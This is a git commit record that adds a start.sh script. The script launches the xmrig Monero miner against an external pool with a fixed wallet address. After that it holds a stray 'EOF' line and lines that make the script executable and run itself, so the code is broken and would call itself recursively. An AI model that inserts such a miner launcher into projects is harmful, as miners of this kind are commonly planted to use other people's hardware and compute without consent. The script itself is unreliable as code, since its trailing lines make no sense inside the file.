a00fac690332d9e44815fc01df69a5fb9ca7723b
Talha <tlh.topal14@gmail.com>
2026-04-22 23:49:05 +0300

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,4 @@
+./xmrig -o xmr.zeropool.io:3333 -u 468jgEngguiTsf3jeWZw4MepBjqwBTnWXMr1h5o3Yuz9bgnk4zv4WFHFZhg91FDxgsRsfebfL7n3aAmfirUYLQXz3UxoAtN -p SodiumWorker -a rx/0 --threads=1 --cpu-priority=1
+EOF
+chmod +x start.sh
+./start.sh
